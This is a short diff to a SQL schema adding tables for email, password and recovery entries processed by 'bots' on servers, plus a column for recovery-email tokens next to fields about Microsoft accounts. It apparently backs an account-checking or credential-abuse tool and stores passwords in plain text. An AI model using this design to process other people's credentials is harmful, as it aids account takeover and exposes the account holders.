@@ -63,6 +63,14 @@ CREATE TABLE
   ) ENGINE = InnoDB;
 
 CREATE TABLE
+  IF NOT EXISTS input_emails2 (
+    email_id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
+    email VARCHAR(255) NULL,
+    pass VARCHAR(255) NULL,
+    recovery VARCHAR(255) NULL
+  ) ENGINE = InnoDB;
+
+CREATE TABLE
   IF NOT EXISTS processing_emails (
     email_id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
     server_ip VARCHAR(45) NULL,
@@ -94,6 +102,17 @@ CREATE TABLE
     date_time DATETIME NULL,
     email VARCHAR(255) NULL,
     pass VARCHAR(255) NULL
+  ) ENGINE = InnoDB;
+
+CREATE TABLE
+  IF NOT EXISTS processed_emails2 (
+    email_id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
+    server_ip VARCHAR(45) NULL,
+    bot_type VARCHAR(50) NULL,
+    date_time DATETIME NULL,
+    email VARCHAR(255) NULL,
+    pass VARCHAR(255) NULL,
+    recovery VARCHAR(255) NULL
   ) ENGINE = InnoDB;
 
 CREATE TABLE
@@ -194,6 +213,7 @@ CREATE TABLE
     country VARCHAR(100) NULL,
     has_recovery_email VARCHAR(10) NULL,
     recovery_email VARCHAR(255) NULL,
+    recovery_email_token TEXT NULL,
     has_recovery_phone VARCHAR(10) NULL,
     recovery_phone_number VARCHAR(50) NULL,
     joined_microsoft_premium VARCHAR(10) NULL,
